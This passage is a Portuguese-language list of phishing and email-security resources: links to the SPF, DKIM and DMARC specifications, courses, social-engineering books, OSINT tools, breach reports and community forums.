**Segurança de E-mail:**

- [SPF Record Syntax](https://www.rfc-editor.org/rfc/rfc7208)
- [DKIM Specification](https://www.rfc-editor.org/rfc/rfc6376)
- [DMARC Specification](https://www.rfc-editor.org/rfc/rfc7489)

### Recursos de Aprendizado

**Cursos:**

- [TryHackMe - Phishing Room](https://tryhackme.com/room/phishing)
- [Coursera - Phishing Attacks](https://www.coursera.org/learn/phishing)
- [SANS - Social Engineering Training](https://www.sans.org/training/)

**Livros:**

- "The Art of Deception" - Kevin Mitnick
- "Social Engineering: The Science of Human Hacking" - Christopher Hadnagy
- "Phishing Dark Waters" - Christopher Hadnagy
- "Ghost in the Wires" - Kevin Mitnick

**Blogs e Artigos:**

- [OWASP Phishing](https://owasp.org/www-community/attacks/Phishing)
- [Phishing.org](https://www.phishing.org/)
- [Security Awareness Blog](https://www.sans.org/security-awareness-training/blog)

### Ferramentas de OSINT

- [theHarvester](https://github.com/laramies/theHarvester) - Coleta de e-mails
- [Recon-ng](https://github.com/lanmaster53/recon-ng) - Framework OSINT
- [Google Dorks](https://www.exploit-db.com/google-hacking-database) - Pesquisa avançada
- [Hunter.io](https://hunter.io/) - Verificação de e-mails
- [Maltego](https://www.maltego.com/) - Visualização de relacionamentos

### Estudos e Estatísticas

- [Verizon Data Breach Investigations Report](https://www.verizon.com/business/resources/reports/dbir/)
- [FBI IC3 Annual Report](https://www.ic3.gov/AnnualReport)
- [Proofpoint Phishing Report](https://www.proofpoint.com/us/resources/threat-reports)
- [Google Phishing Report](https://safebrowsing.google.com/)

### Comunidade

- [OWASP Social Engineering Project](https://owasp.org/www-project-social-engineering/)
- [Reddit - Social Engineering](https://www.reddit.com/r/SocialEngineering/)
- [Security Awareness Subreddit](https://www.reddit.com/r/securityawareness/)
- [Phishing.org Community](https://www.phishing.org/community)